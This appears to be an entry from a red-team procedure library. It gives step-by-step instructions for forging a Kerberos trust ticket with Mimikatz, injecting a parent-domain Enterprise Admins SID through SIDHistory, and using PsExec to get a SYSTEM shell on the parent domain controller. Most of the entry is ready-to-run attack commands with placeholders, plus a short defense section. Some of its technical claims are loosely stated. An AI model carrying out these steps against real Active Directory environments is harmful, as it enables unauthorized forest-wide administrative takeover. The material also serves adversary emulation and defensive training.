---
id: e18f8d24-bb6e-4b44-8ecc-e0157b603d16
name: Forge-Internal-Forest-Trust-Ticket-and-Escalate-to-Parent-DA-via-SIDHistory
type: procedure
verified: true
submitted: true
created_at: '2020-07-20T22:27:56.351948+00:00'
updated_at: '2023-05-25T19:48:24.394453+00:00'
tactics:
  - '[[tactics/Defense-Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Privilege-Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Access-Token-Manipulation|T1134 - Access Token Manipulation]]'
sub_techniques: []
platforms:
  - Windows
tags:
  - '[[tags/Active-Directory]]'
commands:
  - '[[commands/mimikatz-forge-internal-ad-forest-trust-ticket]]'
  - '[[commands/psexec-spawn-powershell-prompt-as-system]]'
  - '[[commands/whoami-display-current-user-sid]]'
  - '[[commands/wmic-get-group-sid-from-active-directory]]'
tools: []
validated: true
---

# Forge-Internal-Forest-Trust-Ticket-and-Escalate-to-Parent-DA-via-SIDHistory

## Summary

This procedure uses the krbtgt NTLM hash from a compromised child domain to forge a Kerberos Trust Ticket. By injecting the SID of a privileged group from the parent domain into the ticket's SIDHistory, an attacker can impersonate high-privilege accounts like Enterprise Admins, achieving domain administrator access in the parent domain. This technique bypasses standard trust restrictions but requires SID filtering to be disabled on the trust (which is the default configuration).

## Description

In a multi-domain Active Directory forest, trusts between child and parent domains allow authentication across boundaries. Attackers with domain admin access in a child domain can extract the krbtgt account's NTLM hash using tools like Mimikatz. This hash is then used to craft a forged Kerberos ticket that includes extra SIDs from the parent domain's privileged groups. When this ticket is passed to the parent domain controller, the attacker's session inherits the injected SIDs, granting elevated privileges without direct compromise of the parent domain. This method is effective in environments where SID filtering is not enforced, enabling lateral movement and persistence across forest boundaries. Prerequisites include domain admin rights in the child domain and network access to the parent DC.

## Requirements

1. Domain administrator credentials or access in the compromised child domain to extract the krbtgt NTLM hash.
2. Tools: Mimikatz for ticket forging, PsExec for remote execution, and built-in Windows utilities (whoami, wmic).
3. Network connectivity from the child domain to the parent domain controller (e.g., via SMB ports 445).
4. SID filtering disabled on the forest trust (default in most AD setups; verify with `nltest /trust:<parent_domain>`).
5. Windows environment with command prompt access.

## Defense

Defensive measures and detection strategies:

- Enable SID filtering on all forest trusts using `netdom trust <child> /d:<parent> /quarantine:yes` to block SIDHistory injection.
- Monitor Kerberos ticket requests for anomalies, such as tickets with unexpected extra SIDs or from the krbtgt account (Event ID 4769 in Windows Security logs).
- Implement privileged access workstations (PAWs) and just-in-time administration to limit exposure of high-privilege accounts.
- Regularly rotate the krbtgt password in all domains to invalidate existing hashes (requires two rotations for full effect).
- Use advanced logging with tools like Microsoft ATA or Azure AD Identity Protection to detect golden/silver ticket usage.

## Objectives

1. Extract the child domain SID and identify a target privileged group SID in the parent domain.
2. Forge a Kerberos trust ticket embedding the parent privileged SID into SIDHistory.
3. Inject the forged ticket into the current session and verify elevated access.
4. Escalate privileges by executing commands on the parent domain controller as a high-privilege user.

## Instructions

### Step 1: Retrieve Child Domain SID

**Context**: Determine the SID of the current child domain by querying the current user's SID and truncating the relative ID (RID) portion. This SID is required for forging the trust ticket and represents the domain component without the user-specific RID.

**Command** ([[commands/whoami-display-current-user-sid]]):
```command_prompt
whoami /user
```

> This command displays the full SID of the current user. The domain SID is the prefix up to but not including the final hyphen and RID (e.g., from S-1-5-21-1576920733-1301476157-954876328-1108, the domain SID is S-1-5-21-1576920733-1301476157-954876328). Use this to confirm the child domain identity before proceeding.

### Step 2: Retrieve Parent Domain Privileged Group SID

**Context**: Query Active Directory for the SID of a high-privilege group in the parent domain, such as Enterprise Admins, which grants forest-wide administrative control. This SID will be injected into the forged ticket's SIDHistory to inherit privileges.

**Command** ([[commands/wmic-get-group-sid-from-active-directory]]):
```command_prompt
wmic.exe group where name="$_TARGET_GROUP" get name,sid,domain
```

> Replace $_TARGET_GROUP with the name of the privileged group (e.g., "Enterprise Admins"). The output provides the SID needed for the next step. Ensure the query targets the parent domain context if running from the child.

### Step 3: Forge the Internal Forest Trust Ticket

**Context**: Use Mimikatz to create a forged Kerberos golden ticket based on the child domain's krbtgt hash, incorporating the child domain SID and the parent group's SID as an extra SID. The /ptt flag injects the ticket directly into the current session for immediate use.

**Command** ([[commands/mimikatz-forge-internal-ad-forest-trust-ticket]]):
```command_prompt
mimikatz.exe "kerberos::golden /domain:$_CHILD_DOMAIN /sid:$_CHILD_DOMAIN_SID /sids:$_ENTERPRISE_ADMIN_SID /user:Administrator /krbtgt:$_KRBTGT_NTLM /ptt" "exit"
```

> Substitute $_CHILD_DOMAIN with the child domain FQDN (e.g., dev.tesla.local), $_CHILD_DOMAIN_SID with the extracted domain SID, $_ENTERPRISE_ADMIN_SID with the parent group SID, and $_KRBTGT_NTLM with the child domain's krbtgt NTLM hash (32-character hex). Success is indicated by the ticket being generated and submitted to the session.

### Step 4: Escalate Access to Parent Domain Controller

**Context**: With the forged ticket injected, use PsExec to connect to a machine in the parent domain (e.g., the DC) and spawn a privileged shell. This verifies the privilege escalation and allows further actions as the impersonated Enterprise Admin.

**Command** ([[commands/psexec-spawn-powershell-prompt-as-system]]):
```command_prompt
PsExec.exe -accepteula \\$_TARGET powershell.exe
```

> Replace $_TARGET with the hostname or IP of the parent domain controller (e.g., \parentdc.tesla.local). The command executes PowerShell remotely as SYSTEM, leveraging the injected ticket for authentication. If successful, you gain an interactive shell with parent DA privileges.
